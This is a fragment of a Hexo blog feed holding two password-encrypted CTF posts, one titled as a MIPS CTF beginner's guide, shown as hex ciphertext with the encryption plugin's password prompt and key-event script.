6cfdf91d28b46cff87b45b50345e78959000d7fa02f898783adb6b85cea1b84a62dfe44e87dba5f0afbbc573081d4de88d9020d212ec4c7e8858362e61b50dbd46310bd069ea1269d161baa177b839fb2b322c8c1e3deaf25ffb9c34adec5e4e52c69aedef88d7efd26924c879c410cbe2e65f0bc214344d06492b4d723591c7faf2f85f0bad0b649348d8ad18145b16776ec7bba2317b7c1106024b269e59c7969e6924e38cb1fabf0b2cf532f081eb3524bed17a55e50b7b62b76f8a27eb5a38230b7757eebae9e4962bfd81cce20034fc09b224c62d60d8e3566af9c954de407b9bf2909253830f51b5c17574456c0ca36a9c400f24a89d2cde8c2d379e69ae630da9493d2d2770dd4cf8ec4ff53dc3f37d70be3a54c03436439d3492ed30341d8648e01f2d803a25513d2bb3b8ca315bf9ef7b3868c60fface22968440261bbfafe8d17e941f259ff1ae9c1da1dcd800ffecaac349b2c12a3e405fb9ac412c3f3fa06c96554099c75c44c339a9484474df18d451bddff079f160e59c15ce4062c215edb04d16db4eac589bd7b640954cf94778b987c1a086aea71657b43d48fd0f5205b3a945885f6f83b1d7e7d8b859bf4e6505e49bf68210560ecc562661542ef61cd9fc81716d88322b096b88ab7db0b542771e38c8991379bf5bbc1ab8523f9c0fa352c51589fe22074531d4cdf38bb85d53f65b5451bb16deabc3a33275e850a78bdf74ecb64d964d5c2f7275ced6af68d117a2d42384025971f5f79e202853d17d96385e3abd5c89345e6fb35308f1ae40814a4dccfaa5fafcbfbfb0e176bb91d5571e0bcbbba31030d9bfb0bb47d10c9f7b440ffd5e2c62a617ceffe06dabb09b9f1a08a3a75c8f88754f4a4b6c050317a847d43694e7e052f16bab560f4fd2b98f20ceefa6055f4f9c349870e47f11621e184a036a11a4fbe9f3fede6cba7239ab1a0c60d0cd6387574a922d3b22f5368d80678e5a591977cc0619f4f416e6ff260ea1d133a88d4cc6086b8eadef67a1a63c29a710d3b8dfe95fc41dd36cd21fd182175907d45b6791f08237580a34b63b3882a423d56080e1e7ac3b1446bc0422873c9860812d5c08469a42d21cd00a96c369b85ea1e2c5a920cb71b5997bf9f3365b127f52bd8b3fac3e08e480cae75ac714395511bd4a534d69057f936f948516779064965acb7c5b9f1c699431b6a58380d575e6ed0205909e4d2f75d270f7a7ca076d75ecebd574a55fd4eabca77dac3976ec4037b52a91cb9bb259169bb67e29f5aa0463d6e0f7f9188981e3df626887a92af5144d6353944e17a82f145a480e54e33269c38bcb828e41ad03c09d65b076f6d87ba3b754e79b99be3ba037b9940e60cbe0b91b2d1932a5a997341b55f0752018156cf1276ac0a411616b90ae77bcac08a1eeb78de8b66226aebd8a275e47b1e79a3e3f7b08d114051626b618d360e7d4dd7fbae34c4f61a891da77b93b262a25512fad8b3794b13f58050c854e91b85a9e6dde68bed98d98ff036ef0c5b7335034038187a8abf1c02c2caa7d8e4732ee5ba0a45d49716add241eead0cb226e0d2bd5b0d99770f8781b621b03cfad2d70ce657c46ab9d0afd5020dc3cf8d6097ab883c11d54fc740d2dcd52c32a8936af7bdd84ce2d857c4b560922db0aec1a3203cb6bc3634fff141d4303cf7a35b036206b60007b5bd211631cd2eac558c4cfd6a10e6112916cc6d162311e84d8cf4fe02b27b595eb2440feaf4b8e48e2ea954ac3aba90d1fffde542489f87b07a37275708265fdeab976b77159525f76b038f8483dd990f90bfca64c1ee70407c2fb817a03be3070da5fccf3daabf1ce1ff51cd898e4383521c68b1ae6e91606529e50f44798c52a5697e4884488755f41fb37ef0d8c3646ccb6dd46ccb6c65e79de84cb058bbaf3e6e6f101a2a296b99e515b26c117f230f2c59f84643e6653f838b2831012022e0c4fc933a33c1395380e469a80a77868581a3d6d220b86ddba4605cec762f208a54ace691c2af2cfafe39e443e7a3138fd46ed2fd752bebb01e5852cceef2abdde6f2beca86711abdd820406f2e9b655657036d6bd9e1886ad0fb9661938cef7e6da07a4f07033110288065fc57609a3e4a201d630abe0e651837c15c76aa9f945c224852c53174bf55ec7f1277d9a0730a9feb8e5f54067fa06becdf0ea90a3c5568815bacac4a6ab4d0347758e91b17e7e6db9c93551d19e509c0ff6c153fdd0aa583a913732886332c5864e782f2600f042742e0d0752155204ec241dc65ae4a0eb0cfea5781159bbb1d58eb4a23d09b52deb6967e37d9d29c7d2970b147e57568937b22ed0802f30ef830bd7c433da9f7b8a5d2485de9cc5181904a31dd73bba81e9a3f7c8bdaf3ea90ebe5696698420043c42908d1fbd4c9d347748ea1acc10aff50c1181a12e9aa69b3a6ebde225ef0109840c69efa11e96c593c4829562c85373958715c81675e2569ea4b85545de057b6e42fef002ef539c0747064352d0c630b2ff41fa75d24dc858547679932e45e9ab1e77f9e9ed85b7b91cc7ee71e5c204bc0efe70b94233d8809ee9b2102ef6a7fc5cc00a1073117472d5c8df26906ce9c8b2ef14a40401976004039e92ddbd2802f57c6f420a70f4d936a2990b1f0238056ea83e53e4ba57d58851b5af57d676065103f93c3e414f8d9e29e9f64c6f1aa5c3fe00c8cf4f789a0f97b4007fb194f9d3f923682249e9449c274d6edf20d78fed4cdfa4b53eef3584d9c9259e9a2f5bf2ce6333edae6fe4dcf1fe57d0de4402e0218c157459446a8b0bdba8b4dc22eb712712e5977c7596557a4a6be3bd0749907670b1fa06788fb9a3fabc39155006139eae18e7655c33a08cd85bb562c1404b448165eb799fa5b22eedce3285b49b0840560a3b3f1b7be0cc9cb1c704f0cd7e8de7bfff71208a50b862189b2d3393446924dfd05ef823dec2ab5c94d738d70b6d55d698ccb166451d60b180178655d1fe07f3f7bfd2915a4bf211555b11b191a96862e40850af66d09ce18f8cdf385ae87aff26cffd2c2d8cfff8181bc72d4cf1b51e5cd1210388d0fb9b91464ceeff4c02a3f5691c478ab990636f2031548b6082dabb90b7a78ebbc3ee09886996fb1c1f40556885899c43d895644fc036872703e4786d8df74eeeaa4b1a622f5d9dbe144a1cc8402834efe9ec032d8ae653ee13fcbe649606f969378c32d44e2ce659ab78a12a375be7c4a8f71d7743e1353db24a0381709292847ab51eb33c0465c4dc8d6b7182f33823e30712e405dcf5e0c993888ac49d4ef76d3953e5f20a3fe46b274d7582ad20469d715d0e784b110d25d9c7ccb7ef81d4eaa9abd539474af49942e8e6dfb5dd50d82b2c2d2365e59de0b839e75008bcf3b76a33139e3a039b0ffbd44e4fbc705f4cb13350eb09602823ed68fce899af8c461537dba499f363f155f898507a98c00e479238a40b79dc37ade660ae9efd882252902fb1d20915f31dd75ca22b8158bfa6e94d7672988b68aa08ccc96d71a53bc054bdb5dbcdb733db0990630f6fda884344f8d50664e53f76b3d50a9c5bfcaba7e4255e98c453883bf4a515efa1b023f24ead9ca869d0c3f6fe5a3ab8046a60a75399b0e4e4b71195fc2863180fb48716a54502383433367739ceb4514e1ccce54d511b72d6e8a2069b265acf7f39129ec688e02df31ec2abc29580dc1715167f74fa5ec857a9459e7a5f4878a9d1e9be4d5deefa8bcaec37e2431ee82da91c99c0907318500722ab29bd2d740a0802ccdc767f895eab9912689def9afea5e773f97c638d05176dc72c7668dc7dc85d0b5379dc05b3d9b9eacbffb6ae7d29502f6b7e39d785e4ff9902e875f136c0d0f4fc3d52f1d8a1fc3f696ef134eafb0758174fff3232527a930467eb743bd7ddb98c2425c03891f1aad0e7633dc9a3feede2dff8f6c9c59a1efd53ded6d47912f9a7574e53e8a28a19ce2963bb79bba7770271e50064590e365d48f24701129256416ab4e549f82551d9aab5ac719a7c22becbaef53030a6ca318d408c5a5459c76f0a943a1475a5dee02f0fac8cdaa517f32cdc0c1f5f8e0e7a61bb4e188febbfd77b551a80b6f36d4f73906fd0c5ea4bf7cd2ce9efaf41dac9d59331c4b441ddbdc6e97a98acfa21db423be92632e1bf68e974b351a93c50393c16dec0244aa6220b3282d1f87785c9e9da48cc9efe5d198d8ec069d80053c92498e22c93dbbbd4c2086e1edc9e72931052e54b5ab084b4ec6f6e6111d5f05b905bc1205f662221e50ba73c970fb5f655241e7831c740da7c26cfd3543d4d47a90829b709961355ab852d39b1a74e4fe04bdf9ac2ce18b465e7e601ab8bc04b91cfc83f978e96a49f0d6c7aa1429ad4d474a58d35a49c9f3b2a4fdc0ef441284f24b9e3f3d3ab5993af1c0c24baf31a5dc018a4d8f3f56bf370fc5c64a3a750ebfa212c1bc0d110658a19867f72b18bd5b69ebfe052dd296f7504d86ce6276379bc87e8b84b8cc490ab08f7425506499a7e00322ab5f6c3229a75204782501887f83ca7ada7ef6144935b7bdad9667ec9865ec93a2749701104101438ed69c2c0b87aba0af6204b331fbd78d24bf20c44b8add74cd97e5c9d7d5c0c575b5aaa2df69cb5b5ad31802b1e48c4a160409e3a38740a93ec96ac4a242182f5ce412765b2961bd99f78bf53561c60a958f08df9c6620e8c946ebb1012673a4780a469f626226592cb15be73e1c3ae0e0262b7be5126ffc60b1309eb76c0a54f229138e6f2ee03cfa86c05803b99eb5e91276222c4b24b471c1afb4f9c264802ede83b3776398c4bdc9acb01a0611a859038d6b25cf01c40d4c8d8a04292c38f0c1521cc671a7b92ed360097256beb04f8d411ee7a8b0d8595aa624743e79273e28cdd5366de63d72363d478f88fe7d3a6d0f4a39e95b5279072ccca358c38b2e0a0aa4287dc5dc6b4f13b042054ac8ff3940c56cad61db660ed5f8babb8807d2b24ce772cead549560b9ee5523b3f1ca5285ae4bd98951a8ca28837e94726b79e2a77eac5913df4dfcfe9aedbda86042401f4b40d6437d2770a6ddfa9c6383bc8da8d199196d07b519df8a7d47be346c51b652db553b20a6a9d03134ada346b0cde60f147d4ea27bf63af995cb40f2f210765311dcac23c7c5f57c588a9bfa9c7edda8660f9a7a6996c3c7b5e247c4db6a3dc4277545ffcaf6d08ea1b9c26c2d84c543e183dc01c43826904a1bbdc1d7348054ab876dbb9d6d683f83224ca2da1700fa48a3b53d9bc4e6aef50062363d75f2f1e2af3503937db52d5cb2d04126a22ff1dab46a0a94afbf065efacb51b5f876009f5dbdc6ae51291b4005f2855c6864349dc5d9b51c0ae3229da4d5ed14c4d417cf9e2439c9ad4cefcae3b79549bd3d51f1837890e51cfd4bfdd60fdb57571253a01b8e8d0707cd91592541090f02b943e1ec92f6d8e1e93483515ac0a4e5e41398a0a58808c8880652ddc6a638277860f46f3944ff55057e16ad8dd97b4a5bc47383046ee4293f1c9046b17e6044c292d4962b0405320e99ec75e16bf8c9ee7903370d346980f1f7925eb286d53d84dcc83211f2726c4e018d57060e7bee0a26088ff4e6f320695a9d0c281204ee320343a34691c6ff04f52198d16ef4a371fa0faad0fe45e69929add3004664536aab3adb4bd26ad916698c54850e0184855fca7a48f7bb9b28ddd55a0d7cd8caf514c482cc4680158f0922982ea46e22e800179e3d4493980cd1db630f410ac0561473c3fcef1439797a68cd2894425c963280b36ed2ad4106681f65655754b9392550cfb41591e6d5558051dd45fff5cd2bc4d1877d8c08824d03abf9db8747afad531df2b43a6a525e0ec2febc14082a9b5b98f893fb6493b36b1130270bc59899f93f0a69eb93b63c46c8a150f7120c9766d009eaaa11aa3e1731273e4dd6e2d67380d8326de5a92bcfec41bbc6f8c03210ce841087549083a664b98e48c36a429ede4460f1e1c5d8c50aa40a585efce9a008b3d64ff3f0068066c66e35410bfc29053272949e8ff917f1f23a9628e91b9b81e51fbcf91ab2f0786a5e31848da2ad5d8baaff5f0b053297f7ec2f05c4a915cb8e96b155b05bd2b89a6cce53c02a2320471ae468a906e19df511972c62656fcb206f9d06d56019adbe6285ddb6e847fb98c31e1a7abe7c1e12a462b361b922ac03b9eb2408cb94a0b183fc4f1d04a03e6d7998f4a047c1655ac25e4d9ebbe56e92d73f1d284fcdb469acd395d43d85002901c92cbf61a1caed6743e0eb321d55d874a87542ddc1fc21a9ea06734d06cba17aee5428ae3c14bff35fc51d947232932f66275ec3e14fb0d9e3a6dfc7ef0e61e0b9ba8f05aac2033eaa79c5119db1a7b8d6fbbe68dda3bd7cb7a5364d01003f976847d620c01ae69933921927f2252c154e22f9674b17bd3b2f7bff8d4c5d929e0dd700dce50fd72a9e7af369f783922c4dc2ba822c01462590200ae439e8c96764a7afc020cd34dbeed188ad74df9723f2b7b90f9de1595681c7d024e0851fbab6bc08170bed2215ebe6b20ef454bd6a30919a857e24f194f96a79c7ecb49adf47d09cb00f953bb82077bed66f5d77c90667dbdf14b5f371f184165bde54f2e7194f97e536107b2c77df0fda123a4ac077f12c2c3e8cfbbe45b36b51a4b9bc64c2fb8e2739fbe24875065cd448515e8b315e0e6c185cba8f36b6506821b230109056de7f79b9b7a49433372f52705baf1d86efa1768ff24a471040eb789b10368d57004be2e2e0ae8424f677622461530ff5b3744e89b3f15ba96a37e06760e77ee103ff032c3c64f5178689eb373f3c2943d8fb1a186d040642284349241fd494e487fd610daafc23989613b076b0233615820918db8fa55262d26aec0e74bf12be453bbfc14d2a21da939d49a3c22181a08fffee1d2011e06e5c78c265e2617142bac8200ebe6958745fadf9178a4acbafcce26fd4cf7fcd65bfa35d935503ebb6a0a5764a86a1dd5dba1eff4be160bcda4131709fe02bf20d34c5dc65cbcea4c5e1cad9cd77403893cabf8ebbc3eaa4d2f8a2e8fdcb2b7e4260bb6a08c134674caa13f004d9c0930e9453e894330f1ba3d421fcb8fc0c1604967811f84ab0ee185ff10a3c8c9ace7c0c48c9600a6ef860cd58bc75fa392a1af32465db571ad286d9e26249c067b2d71f97f1dad8d10118298097af1ddb9557cfb0732ff69a082c4217cc3c80154ccb1d18bb4acff825174f53a21e101f8b88898b95c987c83a845a7a0ed31167980ec510e1e2da2292ada5dabf2fd9f4d271057d70389cb4b978589ac0e2bd513cc9d8ccedd607a6e1717f8edcd51d222cc531f0e6fc8d826e2106c65fe7675078dd89e373ef08605b7d40914134f5607ce064ee5d3904cac4a5ca90577eb08dfd6fec781d066a3f4c9ea3ed0fa9e3feed1206211112e140da9643824eb1697ebd581f874e3b6b5aff14752523af6a0c5f1d4444fcb53f0df67398cd63f4ecf6088a1699b4a62f435c576166f70b28cd7034662a1aea0a2feeda9366487625549e80ac340f6062b7a8e8878a97e3c23012b9b6f32937ef4f01ac48bc484823768b8dbdd4c0355636c113625f3bdb7221e50c688c6019546bed24aa47018bd89b3bc9a071c7dfe713d3bb9f036ba3626ba1dd84014e33a3b69e4eafe86ad566d92854537cfab207acdeee086820c60639d733b3c94e52c351d639b690c302b42ab09c002ff3793ebb27e8225d0b20bfa955753b270bf34dc2c8fd62dc263a8b6f83adc8958053422904898a6f7febff9c702081c68c2d30984f17e5c3213329e32dc7cce5782eda254b4be8d8d2c3898c2c34786215741ddad3537c3fc7adb5a20a0d0a1bdcac6ef287bec9d6aa3276baf397dc59bd81a205dc483fead674b3e16f2ffb6691911270b169c9ce26a6cdb68d3ea6ac0c90b8020482d01694b45349456ed868e218b9c746cb9b327c96c9a8c21670866030699d296c6a53f3bfab9dc67ba21412d8655513586762551719efef27c445cc87b139d5e0baeed08420ecb66c114918a0180ea71bfc572e0856ccbb020bf63cc6be2554abc4719e6f7af3db439368303f0236c34aec652fe93dde296fef7e99ec74a20cac3a4d4d19c14fe4dd42e5e3c4abfb5e8fc4c404db7fc4909911ef3a75caafd4e8f03172d646d6d5ebc5bacf072cf0a2325ee5b06a4bcb0bbdb6462930bf6f974f63d3fb682ba837f6f7b69a600aa6470a97a9be8fb45a657d918fa86e423f7a2a34135cb5f7b7476d6c3bd20f01f9661db5841b889f51254</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-MIPS-入门指南</title>
      <link href="/2019/12/31/CTF-MIPS-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2019/12/31/CTF-MIPS-%E5%85%A5%E9%97%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个密码看着不太对, 请再试试."><div class="hbe-input-container"><input type="password" id="hbePass" placeholder="该文章被加密了，请联系管理员请求密码。" /><label>该文章被加密了，请联系管理员请求密码。</label><button class="hbe-button" onclick="fireKeyEvent(document.getElementById('hexo-blog-encrypt'),'keydown',13);">解密文章</button><div class="bottom-line"></div></div><script>function fireKeyEvent(el, evtType, keyCode){var doc = el.ownerDocument,win = doc.defaultView || doc.parentWindow,evtObj;if(doc.createEvent){if(win.KeyEvent) {evtObj = doc.createEvent('KeyEvents');evtObj.initKeyEvent( evtType, true, true, win, false, false, false, false, keyCode, 0 );}else {evtObj = doc.createEvent('UIEvents');Object.defineProperty(evtObj, 'keyCode', {get : function() { return this.keyCodeVal; }}); Object.defineProperty(evtObj, 'which', {get : function() { return this.keyCodeVal; }});evtObj.initUIEvent( evtType, true, true, win, 1 );evtObj.keyCodeVal = keyCode;if (evtObj.keyCode !== keyCode) {console.log("keyCode " + evtObj.keyCode + " 和 (" + evtObj.which + ") 不匹配");}}el.dispatchEvent(evtObj);} else if(doc.createEventObject){evtObj = doc.createEventObject();evtObj.keyCode = keyCode;el.fireEvent('on' + evtType, evtObj);}}</script><script id="hbeData" type="hbeData" data-hmacdigest="abfbb50f92876653f8d60c6f7fb8466b42f8fbc6f8122bc29563ed10a21a1940">fda99aa060b632c5b34dfa8968c26b82a721def7907b3aa6d25e97fb5869bfa51d6b0bc4dd8055d30e8a07917e4efaa18f5817a3e58a686ca60c4e8a7ee765fe4850a3f5bd63bbdbcbe1fdb16c152098dacf3ba875d15821d59243b35626fb9cc6f7ae7ef4545b9dbbb661ee8a94c0245eba27965fbbb5376386bb98627a6c02ddb5ae38f132abbecea2b6f1eda3e96440d63e4e2fc36d0e6d4aed38f8b27dd49f3f4cb91bbac67bc7fae620fa5b5f585a5e8d7d61aa58d0c3491465b23aa31b23aff12c7ebcc5aecb63fdeda7ab193cfa89377f79cc8fd85bc76a68be43c6aa62758af7e3e32534fb31d08a2cd09d6bd6fcbcdbe945873b5d949bdeb08542d9b5b90a5bc05559aca3341686eaec8d67f589e8e7a9cfbbeb6196dacc80ba799e3558d9c12e41697f64945052b23a38dc1c730125b2fcfd51b1a7fa9c377d9f7e1c7bc4fbd11511a75265c42a927129a7030e1198b98776c0204c99e7919a365318ad05ba06fd9146f7630daa3d175af1e3ff7df97781f94e087c20ade90cd656d3e2fe7b7335efbaa6f1ae4a45ebbf88835acfd27149abcb3dfc20e77404336f74f8e7d2b6291a80f548ecc4ec1606db43c1f1a84444f593bdc2500f8bb249f575642f3bf6ec1f01e88f19fa01feddc668113a4aaa5003639b3af11f68e5385b821bf0737bda7f45cc009fb7c18046f5137dc378c76fab25f42e19dbb135861339de97e5d43feccc43ac0dfcc8ad2486e88e6c4c017052dc114fdb161883d3446575937a9f6a5c419e2574f8c50078d92103ce664a9ffdf2c6f41840b2bfc65d1be7d73836665f45f41f6205de152277071e79b5f883426bf684e32d2e60ae384a004ae013cf26a0f084be03868f01c771c57e62f84a0c39ee7ab6301395b25da3834077ff39b0a5dbc6dd325310a1e875d1cc820c9764987e5b38b8a4d9db5f7d319beb69cc1fb5c3df5a10cfcea4635c370d39083d50981fcc0f83b62117759ebc35a2650306ad8cd438770157d61903339b3e0b513fce727fa39d35f10dc8284b66a1bc6a8809bfe7060c1301376649209476d5d082c81b91134793e65cda6d5ef3408035f2a108d6cbf6a19746f650487ea813297f97fa9ba9abde66d67b258f4d1dcae83a189dfcdc0ac938008088780de35f323d3df7c8cf054499b60fd5ffd41d642c0df5fcd5da985fd5cb791c17e572a45c511d3308f8475697ca4dc55f5b224afe6a9fd12111b32c974f37a08d44c9bed10fad28798a4923566e5bd37d8542168e000a3c8a3ee8148b7c9f94c25e7f09f0235e901291959f96461961ee8e22bacfd91f704b409b813ab306b346196bacf3034008dd2883fc912b9939f730c5825f9ba3b3233ffa588276af8478534d001dc2caf60e77eb2d89d25aaba6e4650f83edc6be372a0fbe8b7127e185144e2474505c0a388daa84415edc6508adf190b30b8b463d6fa4ef4e69c48c2f134ccfc44f564994120ccb88b3f241ce31be8373cec3c7c3f22fa4187086c4f21627187f5a04fcb5cd8196f3190d6036e4d72aaf71a3bc160d3460a664f0f9d56fbeab2122946eded649d78a661b520f8fe7fef77e689c09e5cd8ee7aa2d9a639c22feac52b5930728bac5fe3f950951eb6940c2f459180a5976fb388709422b41721f810c0663d0765ad2061815aec16520761a01eb9a5fe97ce561974fb9b87711e42a252bdf012d50149ddebce2a5a4a9cefd4761f36c13b78aab37d092533db35093283d2796d8b4a95864d3272d65b2cf6b62e9ca9e3d032786544114e9fb26e6593f5a54f1001596bc6409689a4f0d726e803ef7dd8543b6ea6f01f113fe846f40e1171c317229ed7a7118aad7d25fc59315ae4b598678b36d8331ebb2f1a4fd785fbe65834b7e72311781f78d3a766588fa53d8b471e2ab5a612fa5f2f31f2b2832c364b57f78caad8bdce717b7906a4d2fe55ae6ed3e95eb6881ee782cba3410818393b926e9a51f67a1ddf22c5d0cdab50e132776515212b84c1062006f6c896d11343ac6d979db4a6ac15045e0b3ba176474b537e8923e0b3caa929d2babb30f16e793b3bf9f423ff987413ec054ae14f1187d483977ffdbf96271e5ec1622d0a0909c479618fb00b65b6195f98f1e26e7f6952cabac054b8674798eb1f5cc4eb5c4cae86352c2daa70f3a2dedbf3ea12598a7d43db11f518717c9ccc0cffc790765c7addf5d2562fd7e06a66620263c15e39e23840bb8aefc0f44d42b42e9aa184e8272c7a342f2b73596ea7a16dacdd7d7d31fd5da0bd88ea552ec94a5ba7b27a4f6b5e06127d43852b884bc29e9f29cbb10f4d0b295f34029bc91569bb18479f57e930cb53a0a31d8eb8230d01d106787dc82867f70f22b8b788b083b8e652f5d41518f8d74f2bcb779a7af6a8903771a7f3829476a24d1791c1527eeb350380796e6831abb081e47c7c91b4a3cd375f7aac3aa46422a7397167464c5965021a391e4f6c6f95d1d920011200104217fdc6f2fe903244195510fb5ef1ebad0598d98774e71ec8d2db7ef2af4881635f14f4cf1a99178b947f3f6067b3a4c45c43d836916043a49c294d767cce0cd1c7040f0b2066f51b4a51c97e8b58dc254b966068d4799253a6420f91dcc7d619dcbcebab488076135953fae6ad99a2582c87dff8c788616f24aa6e675831dc395d749259e029142cb5c32b1b106ee4b22ff238ca32b59be7f862d2ca042f4b1d4c21bd018272aaf356bbcc21b070f0fa3885ced5b2ccb9cde6ecb1eed30102b018a5f56c173c8600168c114afa55158a1e3498a5c016ea494771b83473e37db2afe4438bb9db90060b9e680962329542ef2015a7fede458beab7eff0dd29176177ac14bec4e379f4afd72976cc9f27b714956c0e5feb3a00c4aaf8d0b5669cc458d4c206b46cdd52895541574f4c6e3b721965e0b44eb65f4c8dc59759d55766da2bcf727c4a98ecfc10ab78dd8e7e484a68ee62ae916fa78defd3551e9c96829ec733260fe97b6d1e5283b73a3f40880b2eb94fd1c6dbba2000bc2e6b50523e5e9537264f2347fe8513712ceb79500a534fcb7083ae7f90307089c1f0e685f1f5f6790f398e1379a84d79348873b9cd7568ab75e9eb6cbd17ee458558a9f54679aeea031c6af45a78d03b20d8523889a682f41e5bd0b2eabc69b4c2e18e524e8360af661046f08e2efe9d79928353e3d104ec25d04b6620c749c464bb88eed7edc91045d17b4e2dff3880eb014be1ab6565c87dd7b18235aa994489a173a4e0b15952c001de931ed29b0c58a4c46a18149829741896ee3358ce2a40f4d226c3c935c6c8cc00ca6a762a0ca0688265895fc1a829d947ef1013a1d22bb4bd1dbda9830996fca71c444a7a5077952fd10ac6c66c6350c436eca9352463962b28e31cf4dfedcd4c028ac816b93b5991a5fd7ef73c963aa65ffae74b6e47a7c4c8b09e75c87433b7d8fd9cdcc60286ccefcd43e96a43270a76e47c8cc059574b8657bd55b90b14ee75961e48d637fb51dfd503569c07316064b560b968fa8dbfd1bff6985c7eeaf4c17e673b83f1c611570143dcd7b546062fa4cc45b39ac581f43e66e046d08cf9adbaccd6ac85fb999eb59134d30c3cf118770a8b72babdf65df12d6caf9221960ac6f5ea6655920dad26506280efd69d397c3a921b074c7ebd3f2df0448cc29643206da3feb74a75fd5f7cb0d26b980df1f3f59c08b4151d92ece26124d1610d4810f2dba3cda0265e00f3f78b20deebdf2399b0b1bf3e8bbe268ae71d290554b280e39fab7538f0e35c12a0d7d5489a20671feec9d75841b2a782da82b78b471ad502896ffa2441a4bdabe7e0d44630e5125c8397ca1d4541ee4fcba97aa65a585e77bd592533f10c17d619caf20f61da22f91bb16a47cd591a9c52f9c52d5571abbf3fc36aeb409ee4da64a9779d18cdf238a20fc319b848d0b3016983b600b7f357d584596d52eef27ffd658d2e6ce6ebc3f690a1d885b75fe050dd07a34aebb31cbb413c19900b6d6bb8c05f0c0ae43754889640a14ce31472a68ee1c5bdad32e577243731f3649612f8e9207fa2e41011e54035fa7920ac0bbf94132d38e6de46e35a7d2281cafca2bb0159e3b6668561913865d8ebee879160d64fafce2cd189d47b02deaa1ed0aa0a501722e50ebb253e79896e9aaca2c078df584546ff7437933f9fc8f6f9beba8f90170300e7fc8d82467f60246747d6bba25574c2859810ec010b65b1945a344385f8c15013a13f33c43149ae61b6b63ade11eb290e460c6a9009fa8b117fdea741f339ce4e63bfc16edb6f53d0efb02c5b976fd36600b3a7519184b3ac9188b8a46193858f478627360ee294a03ee741465ec4a28769cced30b0f2225e6439045683d8c2dcdfd35dd07ce3ec990fe6ecd3e61a014979fee9e54b25dec612ac58195d26cef4792690d2c87bfb2ded444e72db2911c1aef35f44e14611d977f774656aac5efc35e546d7fa957c10f653218a121997096971a5ef203c7af52a5e457fade5c3b5bd73c7bccf0ee27d8dc85bb8ba70842543b57e3ce7865018888759bac38d2207498048e154da99982db9a37a002c084498b2c3d48bb64da12189f2506c04295ecf58e7663e3bc568f2ec181f5145715b8da4ff315a3ab4e73aa9f743c5b30013c8075403f1261343b241506ff35a0d2b8301ddf5c252e95e65705e8b00e235d4a8d03703b8a0604eea29950bd9275bf6202112862201a91c4637fafb71fd1ecf5f08321d867560565bf9ea16793fb1903224eeabce746256d32d08eafe952f5bc005d05d0aad26339df45b24a68fc13502c652f2ec48f418b270825dfc743461d23064dd634866a8c82d4cb6c8c123f99c866164dd6fbcaa47b40ec79445f0942921f2b6c615bb91c24cec14019344ce82e3964a91faa7f6ac5a31c45b7d71f8812131523481443d708cdb974f1cd5f8f100f2a3279eccd1e45c389fade166377e08478eb346e56a906af03af9d0d528c564db8e7f477b136b06b520bfa0d09f685621ac8e0e0ac4afce0111d5d9513cc0ba86abbaaaf0b56cd06bf99f00589eced6df0d1fbd04738777feb92092bbdd80b0a941e7cf733c56eaa7b7f2cd8e458a0d6d529f8c57a1888da0a27ee8d37b9c477da695b2a348dc061c2a8014b4f2f5b0768aed4972979a6c7ee549e5e83c10e0af751548e35f23633cb9a63d19fe80f3661dd939b41a24dcc6cafbef7e87ad53447ccd7e005e58427a0914d8ecbc581821cebc949efc36f048c83163520dee29720a249178681d6be5c880c85a9073b8ba00a0d097074381c5c550dc233c5a65fb172a33872c37126cedd06235dfb1f4c87f5a898f80ec1dd06598928277587fc8cbb57c6d676a123aea39cf6c6f4557ac3519653381a48361675c421e72f86b8f164f9677ee08cd6c0aedc453e604122d54c81162080e685b413983ce51dcde6f8bf21c577c8ae9056836367b57d73a967b0a9efd70b70897ae0085407d2832cd14358f3b34784c2155cc4b12a94a76c64c69b661eb581b739f944b13634c7219d8d45ff9cc19efb96e670ddd66aa65bcf8b00371dc44fadaa0798294a104360fee7d277c61dff0f9204da2a7282073e88ae472d5aecffd26928967c9ba98a3baed76bb77acef2fe5ff261598897a90ec168696bd3d94946abe82a7a3c998acd64646e41ba098f3b49164a0768507e460c3a7f8853922452fa4143e62d457d7d69156a934d3503e2924457887ce5ab34da327be05ae536875a38e683e4aca077cd3ed5595d6a45ca6b5111cc8bdb7634e7188a8d40e4259b7d7662704f32e0ad0e265156693e9cd99d5e1ff26c9e39c0a365cee57c9aeb956ed3eed22beb1219e236a6762a3ab968dcdaacf7d028169c73766886d89177c8fdd5c921929a02449dacb0076de4beb8402c39c46d8102f2b4e348290c2346770847f8e631728078f71ce37b4a70feb5688a77e264fc93fe8af1f1bf6a9ec5d5b0557a9890f25dc586e6c35ea413848d008ca03cb823a7931b512d112a2be1343cddbeb693c807bc06c59ba5e63938bfa33ddbcf24dd85e3c9ddcf21c531af67c3764dd5b9e083d3651c057793e82fbcd73e6424d9e407842232444452095df65b8fee50d55730dd7bc4fe0a8eeb11c73b5f9e8a5941b4697470a54938b5ce2c9fcba526d16704dcefc9313d8c1e3c919f249a31e72cfcb1dbf18819fbe14011fa17d0c8060268630e210caa16df24517193178678c20af3c6f882b8475a977b144b9d25903e833051e03d3c67af67cffa9923727837ca5d37a782f7bc96b7cbd22e86b9367999c5e8957e10a550528610a3bee775d2d0132c630443ebc85ad8a8ce05a555a1998b1070bb512b8ce0c1f24a1f51bfbbdb0a359f3efa09248efc46db27e5557f2f341438c3304844361f855949250455c99d53faee5ac5a928bf85ced31c863c5b86d0440f7e1cede3ab7af186a0f61d36db03d0c100190f18eced3e874a22f2e75e9b691dd8b70ecbbf26b1a8fd212be91fa49ecc3566a8cf846753d2329327ddb28f63ff79b8c1c082bca0a74e862c7abafb1be8e1bc04244b7c479454dcca92bacb22e4e97dfd23c24e9f331daa3ffe5acc09c90f63eb57c7981571d49b765a584fb5552b4c3b8f6de40026abe7a0a52b22f6f5947093ce995548eebc2ff0bf32ad739977a9f7b035bb98a865410ec0902cf11b0d5c1e09d0f2208dcf889e1ffc5d247cf71fa7b05bc39d08b77a9fb6383b3c8ee72802b63e5b6bfa518e4815f0a9990b21abaa73c35b1f9d85ca8b28df9f1c87ac121d5fc1d575d55db0abcdaf59f349b7f9767c177811877a0f830f714e552d0bb20d8b4a8830b8191bbade3d273c5a67479e1f851b43028a025